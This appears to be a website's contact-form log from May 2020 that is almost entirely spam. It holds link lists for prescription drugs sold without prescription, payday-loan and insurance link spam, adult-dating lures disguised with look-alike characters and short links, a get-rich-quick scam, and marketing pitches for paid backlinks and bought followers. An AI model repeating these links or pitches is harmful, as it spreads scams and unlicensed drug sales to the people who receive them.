+++ 2020-05-23 01:26:00 PM -- Email from: Denskels, -- subject: emevbrnf, -- email: ranger20@mail.com, -- Message is: &lt;a href=&quot;http://bectrim.com/&quot;&gt;generic bactrim ds&lt;/a&gt; &lt;a href=&quot;http://wellbutrin911.com/&quot;&gt;buy wellbutrin&lt;/a&gt; &lt;a href=&quot;http://lexepro.com/&quot;&gt;lexapro generic&lt;/a&gt; &lt;a href=&quot;http://advairdsk.com/&quot;&gt;advair inhaler&lt;/a&gt; &lt;a href=&quot;http://celexa24.com/&quot;&gt;celexa citalopram&lt;/a&gt;
+++ 2020-05-23 03:19:44 PM -- Email from: usaa car insurance, -- subject: bdjihypc, -- email: ingo0609@instamail.site, -- Message is: &lt;a href=&quot;https://carinsurancequotes.us.org/&quot;&gt;car insurance quote online&lt;/a&gt;
+++ 2020-05-23 06:17:09 PM -- Email from: Аdult #1 dating aрp fоr аndrоid: https://cutt.us/sjzOE, -- subject: The bеst girls fоr sex in yоur town UК: https://v.ht/L2Neu, -- email: bsantiago5555@yahoo.com, -- Message is: Dаting sitе for seх with girls in Frаnсе: http://r.artscharity.org/Yq8g5
+++ 2020-05-23 06:59:20 PM -- Email from: Best Online Loans, -- subject: xrgugrec, -- email: allison@romail.site, -- Message is: &lt;a href=&quot;https://loansonlinenb.com/&quot;&gt;https://loansonlinenb.com/&lt;/a&gt;
+++ 2020-05-23 11:27:00 PM -- Email from: Evaskels, -- subject: yytlhzvx, -- email: sherita@yahoo.com, -- Message is: &lt;a href=&quot;http://acyclovirv.com/&quot;&gt;how to get acyclovir cream&lt;/a&gt;
+++ 2020-05-24 02:43:53 AM -- Email from: Kimskels, -- subject: uzwfrgpd, -- email: paz@gmail.com, -- Message is: &lt;a href=&quot;https://amoxicillinrem.com/&quot;&gt;amoxicillin 0.25g&lt;/a&gt;
+++ 2020-05-24 03:21:29 AM -- Email from: Janeskels, -- subject: yrgvfrkl, -- email: ailene@gmail.com, -- Message is: &lt;a href=&quot;https://augmentinmed.com/&quot;&gt;buy augmentin&lt;/a&gt;
+++ 2020-05-24 06:55:36 AM -- Email from: Alanskels, -- subject: ylotdmigmq, -- email: lindsay@outlook.com, -- Message is: &lt;a href=&quot;https://kamagrabest.com/&quot;&gt;kamagra buy&lt;/a&gt; &lt;a href=&quot;https://allopurinolm.com/&quot;&gt;cheapest price for allopurinol 300mg&lt;/a&gt; &lt;a href=&quot;https://ampicillintabs.com/&quot;&gt;can you buy ampicillin over the counter&lt;/a&gt; &lt;a href=&quot;https://elimitepermethrin.com/&quot;&gt;elimite cream 5&lt;/a&gt; &lt;a href=&quot;https://amoxicillin05.com/&quot;&gt;buy amoxicillin&lt;/a&gt; &lt;a href=&quot;https://ciprorx.com/&quot;&gt;cipro 250 mg&lt;/a&gt; &lt;a href=&quot;https://trazodone911.com/&quot;&gt;buy trazodone&lt;/a&gt; &lt;a href=&quot;https://fluoxetinemed.com/&quot;&gt;fluoxetine 10 mg capsule&lt;/a&gt; &lt;a href=&quot;https://hydroxychloroquine4.com/&quot;&gt;buy hydroxychloroquine&lt;/a&gt; &lt;a href=&quot;https://toradol365.com/&quot;&gt;buy toradol pills&lt;/a&gt; &lt;a href=&quot;https://retinacrm.com/&quot;&gt;retin a generic cream price&lt;/a&gt; &lt;a href=&quot;https://lexepro.com/&quot;&gt;generic lexapro cost&lt;/a&gt; &lt;a href=&quot;https://prednisonetabs.com/&quot;&gt;buy prednisone&lt;/a&gt; &lt;a href=&quot;https://wellbutrin911.com/&quot;&gt;wellbutrin prescription coupon&lt;/a&gt; &lt;a href=&quot;https://tetracycline911.com/&quot;&gt;cheap tetracycline&lt;/a&gt; &lt;a href=&quot;https://citalopram24.com/&quot;&gt;citalopram 20 mg&lt;/a&gt; &lt;a href=&quot;https://lisinoprilht.com/&quot;&gt;lisinopril generic price in india&lt;/a&gt; &lt;a href=&quot;https://metforminmed.com/&quot;&gt;00mg metformin&lt;/a&gt; &lt;a href=&quot;https://bupropion911.com/&quot;&gt;buy bupropion&lt;/a&gt; &lt;a href=&quot;https://prednisolone360.com/&quot;&gt;prednisolone 5mg tablets&lt;/a&gt;
+++ 2020-05-24 07:06:31 AM -- Email from: car insurance rates, -- subject: fdlcffph, -- email: dziel5512@romail.site, -- Message is: &lt;a href=&quot;https://carinsurancequotes.us.org/&quot;&gt;cheap car insurance quotes&lt;/a&gt;
+++ 2020-05-24 12:41:27 PM -- Email from: Lisaskels, -- subject: dmcsbfiiu, -- email: ndkittycat@outlook.com, -- Message is: &lt;a href=&quot;https://diflucanmed.com/&quot;&gt;generic diflucan online&lt;/a&gt;
+++ 2020-05-24 06:32:06 PM -- Email from: Markskels, -- subject: kzwgjslya, -- email: jduffyelectric@mail.com, -- Message is: &lt;a href=&quot;https://colchicinelab.com/&quot;&gt;colchicine 0.6&lt;/a&gt; &lt;a href=&quot;https://diflucanf.com/&quot;&gt;diflucan 6 tabs&lt;/a&gt; &lt;a href=&quot;https://ampicillintabs.com/&quot;&gt;buy ampicillin online&lt;/a&gt; &lt;a href=&quot;https://ataraxrx.com/&quot;&gt;atarax over the counter uk&lt;/a&gt;
+++ 2020-05-24 08:22:43 PM -- Email from: Jackskels, -- subject: nvzlzqvi, -- email: bunnymcmurray@hotmail.com, -- Message is: &lt;a href=&quot;https://zithromaxcov.com/&quot;&gt;order zithromax online uk&lt;/a&gt; &lt;a href=&quot;https://tretinoint.com/&quot;&gt;cost of generic tretinoin&lt;/a&gt; &lt;a href=&quot;https://furosemidepill.com/&quot;&gt;buy furosemide&lt;/a&gt; &lt;a href=&quot;https://advairdsk.com/&quot;&gt;advair diskus&lt;/a&gt; &lt;a href=&quot;https://amoxicillin05.com/&quot;&gt;amoxicillin 500 tablet&lt;/a&gt; &lt;a href=&quot;https://elimitepermethrin.com/&quot;&gt;where to purchase elimite&lt;/a&gt; &lt;a href=&quot;https://zoloftsert.com/&quot;&gt;zoloft discount coupon&lt;/a&gt;
+++ 2020-05-24 09:26:10 PM -- Email from: Paulskels, -- subject: xffzobvcp, -- email: valorie@mail.com, -- Message is: &lt;a href=&quot;https://lisinoprilht.com/&quot;&gt;buy lisinopril&lt;/a&gt; &lt;a href=&quot;https://paxil24.com/&quot;&gt;generic for paxil&lt;/a&gt; &lt;a href=&quot;https://augmentinmed.com/&quot;&gt;augmentin 500 mg tab&lt;/a&gt; &lt;a href=&quot;https://vardenafilmed.com/&quot;&gt;vardenafil tablets in india&lt;/a&gt; &lt;a href=&quot;https://zithromaxcov.com/&quot;&gt;how to get zithromax online&lt;/a&gt;
+++ 2020-05-25 12:31:44 AM -- Email from: Carlskels, -- subject: gywomilhcn, -- email: dcdigrec@outlook.com, -- Message is: &lt;a href=&quot;https://tetracycline911.com/&quot;&gt;tetracycline pills&lt;/a&gt; &lt;a href=&quot;https://wellbutrin911.com/&quot;&gt;buy wellbutrin&lt;/a&gt; &lt;a href=&quot;https://citalopram24.com/&quot;&gt;citalopram online&lt;/a&gt; &lt;a href=&quot;https://retinacrm.com/&quot;&gt;retin a from india&lt;/a&gt; &lt;a href=&quot;https://cytotecrx.com/&quot;&gt;cytotec pill&lt;/a&gt;
+++ 2020-05-25 07:51:46 AM -- Email from: Sех dating in Аustrаlia | Girls fоr seх in Australiа: http://www.zingby.com/uss/TPFSB/, -- subject: Веautiful girls for sех in уour сitу: https://cutt.us/CcfFu, -- email: ikaros21@yahoo.com, -- Message is: Dаting sitе for seх with girls from Germаnу: http://youwa.lk/?url=0B56n
+++ 2020-05-25 11:19:23 AM -- Email from: Kiaskels, -- subject: eccmslvv, -- email: ktvine@mail.com, -- Message is: &lt;a href=&quot;http://advairdsk.com/&quot;&gt;advair diskus 2018&lt;/a&gt;
+++ 2020-05-25 03:11:28 PM -- Email from: Kimskels, -- subject: zxbxmfop, -- email: higginsdolores@aol.com, -- Message is: &lt;a href=&quot;https://metforminmed.com/&quot;&gt;metformin 500&lt;/a&gt;
+++ 2020-05-25 05:35:56 PM -- Email from: Jimskels, -- subject: yrjjdnfl, -- email: kotakikuchi@mail.com, -- Message is: &lt;a href=&quot;https://dapoxetine20.com/&quot;&gt;dapoxetine drug in india&lt;/a&gt; &lt;a href=&quot;https://lexepro.com/&quot;&gt;buy lexapro&lt;/a&gt;
+++ 2020-05-26 12:54:58 AM -- Email from: texas auto insurance, -- subject: stjlfaba, -- email: alpined@msmx.site, -- Message is: &lt;a href=&quot;https://carinsurancequotes.us.org/&quot;&gt;car insurance quotes comparison&lt;/a&gt;
+++ 2020-05-26 01:37:48 AM -- Email from: Spotloan, -- subject: nrpswglz, -- email: notyoutoo22@jumbox.site, -- Message is: &lt;a href=&quot;https://personaliloans.com/&quot;&gt;payday loans las vegas nv&lt;/a&gt;
+++ 2020-05-26 07:49:31 AM -- Email from: Ugoskels, -- subject: dghyjeyh, -- email: barbarasnow@outlook.com, -- Message is: &lt;a href=&quot;http://allopurinolm.com/&quot;&gt;allopurinol generic brand&lt;/a&gt; &lt;a href=&quot;http://metforminmed.com/&quot;&gt;metformin 500&lt;/a&gt; &lt;a href=&quot;http://diflucanf.com/&quot;&gt;diflucan 50mg&lt;/a&gt; &lt;a href=&quot;http://cozaar24.com/&quot;&gt;cozaar&lt;/a&gt; &lt;a href=&quot;http://prozacfluo.com/&quot;&gt;prozac 40 mg&lt;/a&gt; &lt;a href=&quot;http://ventolininhl.com/&quot;&gt;ventolin online canada&lt;/a&gt; &lt;a href=&quot;http://wellbutrin911.com/&quot;&gt;wellbutrin xl&lt;/a&gt; &lt;a href=&quot;http://advairdsk.com/&quot;&gt;us cost advair diskus&lt;/a&gt;
+++ 2020-05-26 10:42:53 AM -- Email from: Dating site for seх with girls in Franсe: https://cutt.us/PRiPt, -- subject: Аdult onlinе dating mеmbershiр numbers: http://wiesl.de/yTU, -- email: , -- Message is: Аdult оnline dаting whаtsарр numbеrs: https://1borsa.com/sexygirlsdating867304
+++ 2020-05-26 01:05:52 PM -- Email from: Speedy Cash, -- subject: nnzaoyos, -- email: petteysusan@jumbox.site, -- Message is: &lt;a href=&quot;https://onlineloan.us.com/&quot;&gt;colorado payday loans&lt;/a&gt;
+++ 2020-05-26 01:13:21 PM -- Email from: Steve French, -- subject: Start Using LinkedIn For Business Growth, -- email: s.french@drivetheleads.com, -- Message is: Impressive site. No doubt your clients appreciate your services and the time invested in your digital presence. I did however notice your business does not have a very strong LinkedIn presence. 
 
As you know, LinkedIn is the number one business social network and the best tool for networking and business growth. 
 
My company Drivetheleads.com uses LinkedIn networking exclusively for growth hacking on behalf of clients. The targeting is simply amazing. 
 
Can we schedule a quick demo or I can shoot you over an explainer video that reviews how my team can easily help expand your client base in a super affordable way? 
 
Thanks. 
Steve French 
s.french@drivetheleads.com 
http://www.drivetheleads.com
+++ 2020-05-26 02:48:26 PM -- Email from: Eyeskels, -- subject: hrnujnmv, -- email: lyonswade@yahoo.com, -- Message is: &lt;a href=&quot;http://allopurinolm.com/&quot;&gt;allopurinol 100 mg&lt;/a&gt; &lt;a href=&quot;http://bectrim.com/&quot;&gt;bactrim ds 800 160&lt;/a&gt; &lt;a href=&quot;http://fluoxetinemed.com/&quot;&gt;fluoxetine 20mg&lt;/a&gt; &lt;a href=&quot;http://citalopram24.com/&quot;&gt;buy citalopram 20mg&lt;/a&gt; &lt;a href=&quot;http://lasixsale.com/&quot;&gt;buy lasix tablets india&lt;/a&gt; &lt;a href=&quot;http://albenzamed.com/&quot;&gt;albenza 200&lt;/a&gt; &lt;a href=&quot;http://augmentinmed.com/&quot;&gt;buy augmentin&lt;/a&gt; &lt;a href=&quot;http://cytotecrx.com/&quot;&gt;cytotec 200&lt;/a&gt; &lt;a href=&quot;http://wellbutrin911.com/&quot;&gt;wellbutrin price uk&lt;/a&gt; &lt;a href=&quot;http://amoxicillin05.com/&quot;&gt;cheap amoxicillin 500mg&lt;/a&gt; &lt;a href=&quot;http://lisinoprilht.com/&quot;&gt;lisinopril for sale uk&lt;/a&gt; &lt;a href=&quot;http://amoxilb.com/&quot;&gt;buy amoxil&lt;/a&gt; &lt;a href=&quot;http://albuterolinhl.com/&quot;&gt;buy albuterol from mexico&lt;/a&gt; &lt;a href=&quot;http://hydroxychlorequine.com/&quot;&gt;hydroxychloroquine sulfate&lt;/a&gt; &lt;a href=&quot;http://ventolininhl.com/&quot;&gt;ventolin otc australia&lt;/a&gt; &lt;a href=&quot;http://diflucanmed.com/&quot;&gt;diflucan generic&lt;/a&gt; &lt;a href=&quot;http://tetracycline911.com/&quot;&gt;buy tetracycline&lt;/a&gt; &lt;a href=&quot;http://kamagrabest.com/&quot;&gt;kamagra pills south africa&lt;/a&gt; &lt;a href=&quot;http://acyclovirv.com/&quot;&gt;acyclovir medication cost&lt;/a&gt; &lt;a href=&quot;http://amoxicillinrem.com/&quot;&gt;amoxicillin canada prescription&lt;/a&gt;
+++ 2020-05-26 03:05:18 PM -- Email from: Payday Express, -- subject: lrspaiwo, -- email: claudiasrichter@qtmx.space, -- Message is: &lt;a href=&quot;https://onlineloan.us.com/&quot;&gt;loan site&lt;/a&gt;
+++ 2020-05-26 05:14:45 PM -- Email from: Janeskels, -- subject: vkbvibio, -- email: rolfeogustavsson@aol.com, -- Message is: &lt;a href=&quot;https://tetracycline911.com/&quot;&gt;antibiotic tetracycline&lt;/a&gt;
+++ 2020-05-26 09:28:54 PM -- Email from: Amyskels, -- subject: ssnjaxkznl, -- email: mrcyaluoch@mail.com, -- Message is: &lt;a href=&quot;https://paxil24.com/&quot;&gt;generic of paxil&lt;/a&gt;
+++ 2020-05-27 03:52:55 AM -- Email from: Denskels, -- subject: wdprpibo, -- email: rosalia@outlook.com, -- Message is: &lt;a href=&quot;http://ciprorx.com/&quot;&gt;cipro xr&lt;/a&gt; &lt;a href=&quot;http://lasixsale.com/&quot;&gt;lasix for sale online&lt;/a&gt; &lt;a href=&quot;http://bupropion911.com/&quot;&gt;bupropion 682&lt;/a&gt; &lt;a href=&quot;http://amoxicillin05.com/&quot;&gt;amoxicillin 500mg prescription&lt;/a&gt; &lt;a href=&quot;http://amoxilb.com/&quot;&gt;buy amoxil&lt;/a&gt;
+++ 2020-05-27 04:41:47 AM -- Email from: Judyskels, -- subject: tozbpjrjlt, -- email: enviroflora@yahoo.com, -- Message is: &lt;a href=&quot;https://advairdsk.com/&quot;&gt;medication advair diskus&lt;/a&gt; &lt;a href=&quot;https://amoxicillinrem.com/&quot;&gt;amoxicillin 500&lt;/a&gt; &lt;a href=&quot;https://retinacrm.com/&quot;&gt;retin a microgel&lt;/a&gt; &lt;a href=&quot;https://albuterolinhl.com/&quot;&gt;buy albuterol without a prescription&lt;/a&gt; &lt;a href=&quot;https://hydroxychlorequine.com/&quot;&gt;hydroxychloroquine prices&lt;/a&gt; &lt;a href=&quot;https://lexepro.com/&quot;&gt;lexapro price&lt;/a&gt; &lt;a href=&quot;https://buspar365.com/&quot;&gt;buspar medication&lt;/a&gt; &lt;a href=&quot;https://paxil24.com/&quot;&gt;paxil cr generic&lt;/a&gt; &lt;a href=&quot;https://tretinoint.com/&quot;&gt;tretinoin 0.025 gel uk&lt;/a&gt; &lt;a href=&quot;https://finasteride24.com/&quot;&gt;finasteride online&lt;/a&gt;
+++ 2020-05-27 04:51:06 AM -- Email from: Payday Loans, -- subject: ympkirju, -- email: jwarnerlisw@msmx.site, -- Message is: &lt;a href=&quot;https://onlineloan.us.com/&quot;&gt;online loan&lt;/a&gt;
+++ 2020-05-27 06:27:29 AM -- Email from: Sueskels, -- subject: dvrmixxp, -- email: sjrosenberger@mail.com, -- Message is: &lt;a href=&quot;https://amoxicillinrem.com/&quot;&gt;amoxicillin 500mg capsules antibiotic&lt;/a&gt; &lt;a href=&quot;https://tretinoint.com/&quot;&gt;buy tretinoin&lt;/a&gt; &lt;a href=&quot;https://celexa24.com/&quot;&gt;celexa&lt;/a&gt; &lt;a href=&quot;https://cytotecrx.com/&quot;&gt;buy cytotec&lt;/a&gt; &lt;a href=&quot;https://ampicillintabs.com/&quot;&gt;ampicillin buy&lt;/a&gt; &lt;a href=&quot;https://amoxilb.com/&quot;&gt;buy amoxil&lt;/a&gt; &lt;a href=&quot;https://kamagrabest.com/&quot;&gt;buy kamagra&lt;/a&gt; &lt;a href=&quot;https://metforminmed.com/&quot;&gt;metformin 500&lt;/a&gt; &lt;a href=&quot;https://wellbutrin911.com/&quot;&gt;wellbutrin sr 150 mg&lt;/a&gt; &lt;a href=&quot;https://toradol365.com/&quot;&gt;toradol tablets&lt;/a&gt;
+++ 2020-05-27 09:50:37 AM -- Email from: Claudia Clement, -- subject: DA 96 Do-follow Backlink from Amazon to esyray.com?, -- email: claudiauclement@yahoo.com, -- Message is: Hi, We are wondering if you would be interested in our service, where we can provide you with a dofollow link from Amazon (DA 96) back to esyray.com?

The price is just $67 per link, via Paypal.

To explain what DA is and the benefit for your website, along with a sample of an existing link, please read here: https://justpaste.it/4fnds

If you'd be interested in learning more, reply to this email but please make sure you include the word INTERESTED in the subject line field.

Kind Regards,
Claudia
+++ 2020-05-27 10:59:55 AM -- Email from: Samskels, -- subject: gdomajur, -- email: lbeekma@mail.com, -- Message is: &lt;a href=&quot;http://lexepro.com/&quot;&gt;lexapro 10 mg tablet&lt;/a&gt; &lt;a href=&quot;http://zoloftsert.com/&quot;&gt;zoloft 300 mg&lt;/a&gt; &lt;a href=&quot;http://amoxicillin05.com/&quot;&gt;amoxicillin canada&lt;/a&gt; &lt;a href=&quot;http://albenzamed.com/&quot;&gt;buy albenza&lt;/a&gt; &lt;a href=&quot;http://amoxicillinrem.com/&quot;&gt;amoxicillin 500 mg&lt;/a&gt; &lt;a href=&quot;http://celexa24.com/&quot;&gt;celexa&lt;/a&gt;
+++ 2020-05-27 11:47:34 AM -- Email from: Nickskels, -- subject: mkzoyfhr, -- email: arne42@outlook.com, -- Message is: &lt;a href=&quot;http://ampicillintabs.com/&quot;&gt;ampicillin 1g&lt;/a&gt; &lt;a href=&quot;http://furosemidepill.com/&quot;&gt;buy furosemide&lt;/a&gt; &lt;a href=&quot;http://trazodone911.com/&quot;&gt;cost of trazodone 25 mg&lt;/a&gt; &lt;a href=&quot;http://anafranil24.com/&quot;&gt;anafranil online india&lt;/a&gt; &lt;a href=&quot;http://hydroxychlorequine.com/&quot;&gt;buy hydroxychloroquine&lt;/a&gt; &lt;a href=&quot;http://albuterolinhl.com/&quot;&gt;buy albuterol online cheap&lt;/a&gt; &lt;a href=&quot;http://buspar365.com/&quot;&gt;buspar cost&lt;/a&gt; &lt;a href=&quot;http://dapoxetine20.com/&quot;&gt;buy dapoxetine&lt;/a&gt;
+++ 2020-05-27 05:28:45 PM -- Email from: Dаting fоr sex | Bаdoo: https://v.ht/8UvPA, -- subject: Dating sitе for sех with girls in Gеrmаnу: http://gongpo.moum.kr/adultdatinginyourcity659962, -- email: , -- Message is: Sеxу girls for thе night in yоur town USA: http://gg.gg/is3ci
+++ 2020-05-27 11:52:44 PM -- Email from: Maryskels, -- subject: zpyolqiks, -- email: halley@aol.com, -- Message is: &lt;a href=&quot;https://furosemidepill.com/&quot;&gt;furosemide online&lt;/a&gt; &lt;a href=&quot;https://amoxicillinrem.com/&quot;&gt;amoxicillin 625mg tablet price&lt;/a&gt; &lt;a href=&quot;https://lisinoprilht.com/&quot;&gt;buy lisinopril&lt;/a&gt; &lt;a href=&quot;https://prednisolone360.com/&quot;&gt;prednisolone 10 mg&lt;/a&gt; &lt;a href=&quot;https://cozaar24.com/&quot;&gt;buy cozaar cheap&lt;/a&gt; &lt;a href=&quot;https://colchicinelab.com/&quot;&gt;colchicine 0.6 mg price&lt;/a&gt; &lt;a href=&quot;https://kamagrabest.com/&quot;&gt;kamagra for sale in usa&lt;/a&gt; &lt;a href=&quot;https://acyclovirv.com/&quot;&gt;acyclovir 400 mg&lt;/a&gt; &lt;a href=&quot;https://dapoxetine20.com/&quot;&gt;dapoxetine buy online canada&lt;/a&gt; &lt;a href=&quot;https://tretinoint.com/&quot;&gt;can i buy tretinoin online&lt;/a&gt;
+++ 2020-05-28 03:54:07 AM -- Email from: Spotloan, -- subject: nzlxzpaw, -- email: acrylicb@romail.site, -- Message is: &lt;a href=&quot;https://personaliloans.com/&quot;&gt;personal loan interest rates&lt;/a&gt;
+++ 2020-05-28 10:36:28 AM -- Email from: MylesRAB, -- subject: Become a millionaire in a month, -- email: lloyd65carpenter@yahoo.co.uk, -- Message is: I really struggled to survive earlier this year. 
I lived on credit cards, family loans and handouts. 
Now I earn six numbers every month! I have now bought my first house. 
http://pcex.terryjoemarketing.com/8354c4ce 
Works on all devices, including smartphones, so you can check in anytime, anywhere! 
http://dbz.touristika.net/9d627
+++ 2020-05-28 05:36:41 PM -- Email from: Speedy Cash, -- subject: nmozqott, -- email: mickd@qtmx.space, -- Message is: &lt;a href=&quot;https://onlineloan.us.com/&quot;&gt;specialized loan services&lt;/a&gt;
+++ 2020-05-28 09:01:02 PM -- Email from: Online Loan, -- subject: yeppbbhc, -- email: cjnicklaw@msmx.site, -- Message is: &lt;a href=&quot;https://personaliloans.com/&quot;&gt;personal loans with bad credit&lt;/a&gt;
+++ 2020-05-28 09:46:16 PM -- Email from: Kiaskels, -- subject: yyxqnudm, -- email: coleman@outlook.com, -- Message is: &lt;a href=&quot;http://citalopram24.com/&quot;&gt;citalopram 40 mg&lt;/a&gt;
+++ 2020-05-28 09:51:38 PM -- Email from: Adult #1 dаting арp for аndrоid: http://www.gots.ms/sexygirlsdating466239, -- subject: Аdult dаting аmеricаn lаdiеs оnline: https://hideuri.com/lR6yVo, -- email: mirkosavodj@hotmail.it, -- Message is: Adult online dating by the numbers: https://cutt.us/KcFbv
+++ 2020-05-29 06:11:21 AM -- Email from: Huey Carvana, -- subject: Cassandra Dreyer, -- email: Leitzel22665@gmail.com, -- Message is: Quit paying 1000's of dollars for expensive Google ads! Let me show you a platform that costs only a very small bit of money and delivers an almost endless volume of traffic to your website For more information just visit: http://www.adpostingrobot.xyz
+++ 2020-05-29 06:26:47 AM -- Email from: Amyskels, -- subject: xctsykswej, -- email: adamhfrank@mail.com, -- Message is: &lt;a href=&quot;https://diflucanmed.com/&quot;&gt;diflucan without prescription 200mg&lt;/a&gt;
+++ 2020-05-29 06:52:12 AM -- Email from: Cash Loan, -- subject: cwgmtoyy, -- email: boulangermo@msmx.site, -- Message is: &lt;a href=&quot;https://onlineloan.us.com/&quot;&gt;loan application&lt;/a&gt;
+++ 2020-05-29 08:19:14 AM -- Email from: aaa car insurance, -- subject: bnqwvjgt, -- email: renostar1960@qtmx.space, -- Message is: &lt;a href=&quot;https://carinsurancequotes.us.org/&quot;&gt;https://carinsurancequotes.us.org/&lt;/a&gt;
+++ 2020-05-29 09:49:42 AM -- Email from: Jasonskels, -- subject: ymopjzwl, -- email: hudsman1@gmail.com, -- Message is: &lt;a href=&quot;http://elimitepermethrin.com/&quot;&gt;buy elimite&lt;/a&gt; &lt;a href=&quot;http://metforminmed.com/&quot;&gt;drug metformin&lt;/a&gt; &lt;a href=&quot;http://lisinoprilht.com/&quot;&gt;lisinopril 10 mg tablet&lt;/a&gt; &lt;a href=&quot;http://prozacfluo.com/&quot;&gt;best prozac price no prescription&lt;/a&gt; &lt;a href=&quot;http://tretinoint.com/&quot;&gt;buy tretinoin&lt;/a&gt; &lt;a href=&quot;http://allopurinolm.com/&quot;&gt;allopurinol 1&lt;/a&gt; &lt;a href=&quot;http://lasixsale.com/&quot;&gt;lasix 40&lt;/a&gt; &lt;a href=&quot;http://anafranil24.com/&quot;&gt;25 mg anafranil online&lt;/a&gt; &lt;a href=&quot;http://zoloftsert.com/&quot;&gt;buy zoloft online&lt;/a&gt; &lt;a href=&quot;http://prednisonetabs.com/&quot;&gt;prednisone buy&lt;/a&gt;
+++ 2020-05-29 10:42:37 AM -- Email from: geico car insurance, -- subject: nupirkme, -- email: badboy68@jumbox.site, -- Message is: &lt;a href=&quot;https://carinsurancequotes.us.org/&quot;&gt;auto insurance in georgia&lt;/a&gt;
+++ 2020-05-29 04:04:45 PM -- Email from: Kathy Martin, -- subject: RE: social media blast, -- email: social@fastem.com, -- Message is: Hi,

We are one of the largest suppliers of social media marketing services.
Facebook, Twitter, Instagram and Youtube.

Would you like to give your social media a huge amount of followers,
likes, shares, subscribers and views fast and at a great price?

For more info please visit us at https://social-media-blast.com

We look forward to skyrocketing your social media needs.

Kind Regards,
Kathy
SMB
+++ 2020-05-30 04:39:04 AM -- Email from: Ugoskels, -- subject: wjnneewt, -- email: vickiterry@outlook.com, -- Message is: &lt;a href=&quot;http://anafranil24.com/&quot;&gt;anafranil 75&lt;/a&gt; &lt;a href=&quot;http://celexa24.com/&quot;&gt;celexa&lt;/a&gt;
+++ 2020-05-30 10:02:10 AM -- Email from: Веautiful girls fоr sех in yоur сity: http://gx.nz//89770, -- subject: Dating fоr sех | Grеat Britаin: http://csgo4.ru/sexdating257401, -- email: teslim@mailla.de, -- Message is: The bеst wоmen fоr sеx in уоur tоwn AU: https://v.ht/vAK7w
+++ 2020-05-30 02:14:33 PM -- Email from: Markskels, -- subject: whsykkmvq, -- email: wlbbigtonka@aol.com, -- Message is: &lt;a href=&quot;https://amoxicillin05.com/&quot;&gt;amoxicillin buy online india&lt;/a&gt; &lt;a href=&quot;https://diflucanmed.com/&quot;&gt;diflucan buy in usa&lt;/a&gt;
+++ 2020-05-30 02:54:58 PM -- Email from: Denskels, -- subject: cwaagjew, -- email: chanda@outlook.com, -- Message is: &lt;a href=&quot;http://ataraxrx.com/&quot;&gt;buy atarax&lt;/a&gt; &lt;a href=&quot;http://amoxicillin05.com/&quot;&gt;where can you buy amoxicillin over the counter&lt;/a&gt; &lt;a href=&quot;http://prednisonetabs.com/&quot;&gt;prednisone 5093&lt;/a&gt; &lt;a href=&quot;http://metforminmed.com/&quot;&gt;generic metformin prescription canada&lt;/a&gt; &lt;a href=&quot;http://lisinoprilht.com/&quot;&gt;lisinopril 5 mg coupon&lt;/a&gt;
+++ 2020-05-30 04:24:14 PM -- Email from: texas auto insurance, -- subject: tcgydjjn, -- email: fiveoak3ts@jumbox.site, -- Message is: &lt;a href=&quot;https://carinsurancequotes.us.org/&quot;&gt;grundy insurance company&lt;/a&gt;
+++ 2020-05-30 06:24:55 PM -- Email from: Alanskels, -- subject: qeypcjhkxd, -- email: arthurfmerchant@mail.com, -- Message is: &lt;a href=&quot;https://bupropion911.com/&quot;&gt;buy bupropion&lt;/a&gt; &lt;a href=&quot;https://metforminmed.com/&quot;&gt;buy metfornin without prescription drugs online&lt;/a&gt; &lt;a href=&quot;https://toradol365.com/&quot;&gt;toradol 20 mg&lt;/a&gt; &lt;a href=&quot;https://citalopram24.com/&quot;&gt;buy citalopram&lt;/a&gt; &lt;a href=&quot;https://dapoxetine20.com/&quot;&gt;dapoxetine buy online&lt;/a&gt; &lt;a href=&quot;https://trazodone911.com/&quot;&gt;trazodone 50 mg tablet&lt;/a&gt; &lt;a href=&quot;https://acyclovirv.com/&quot;&gt;acyclovir cream cream&lt;/a&gt; &lt;a href=&quot;https://cytotecrx.com/&quot;&gt;where to buy cytotec pills&lt;/a&gt; &lt;a href=&quot;https://hydroxychloroquine4.com/&quot;&gt;buy hydroxychloroquine&lt;/a&gt; &lt;a href=&quot;https://celexa24.com/&quot;&gt;celexa&lt;/a&gt; &lt;a href=&quot;https://diflucanmed.com/&quot;&gt;diflucan uk online&lt;/a&gt; &lt;a href=&quot;https://ampicillintabs.com/&quot;&gt;buy ampicillian&lt;/a&gt; &lt;a href=&quot;https://augmentinmed.com/&quot;&gt;augmentin 875mg&lt;/a&gt; &lt;a href=&quot;https://prednisolone360.com/&quot;&gt;prednisolone 25mg&lt;/a&gt; &lt;a href=&quot;https://buspar365.com/&quot;&gt;buspar 7.5&lt;/a&gt; &lt;a href=&quot;https://albuterolinhl.com/&quot;&gt;albuterol sulfate inhaler&lt;/a&gt; &lt;a href=&quot;https://lasixp.com/&quot;&gt;buy lasix&lt;/a&gt; &lt;a href=&quot;https://amoxilb.com/&quot;&gt;amoxil 500 mg capsules&lt;/a&gt; &lt;a href=&quot;https://allopurinolm.com/&quot;&gt;allopurinol 300 mg&lt;/a&gt; &lt;a href=&quot;https://diflucanf.com/&quot;&gt;can i buy diflucan online&lt;/a&gt;
+++ 2020-05-30 11:59:54 PM -- Email from: Online Payday Loans, -- subject: roibekmw, -- email: willette@qtmx.space, -- Message is: &lt;a href=&quot;https://onlineloan.us.com/&quot;&gt;installment loans online direct lender&lt;/a&gt;
+++ 2020-05-31 12:52:24 AM -- Email from: Instant Online Loans, -- subject: omeuhydb, -- email: yanpingma7@qtmx.space, -- Message is: &lt;a href=&quot;https://loansonlinenb.com/&quot;&gt;loans personal&lt;/a&gt;
+++ 2020-05-31 03:08:24 AM -- Email from: Barbara Atyson, -- subject: Explainer Videos for esyray.com, -- email: barbaratysonhw@yahoo.com, -- Message is: Hi,

We'd like to introduce to you our explainer video service which we feel can benefit your site esyray.com.

Check out some of our existing videos here:
https://www.youtube.com/watch?v=zvGF7uRfH04
https://www.youtube.com/watch?v=MOnhn77TgDE
https://www.youtube.com/watch?v=KhSCHaI6gw0

All of our videos are in a similar animated format as the above examples and we have voice over artists with US/UK/Australian accents.

They can show a solution to a problem or simply promote one of your products or services. They are concise, can be uploaded to video such as Youtube, and can be embedded into your website or featured on landing pages.

Our prices are as follows depending on video length:
0-1 minutes = $159
1-2 minutes = $269
2-3 minutes = $379

*All prices above are in USD and include a custom video, full script and a voice-over.

If this is something you would like to discuss further, don't hesitate to get in touch.
If you are not interested, simply delete this message and we won't contact you again.

Kind Regards,
Barbara
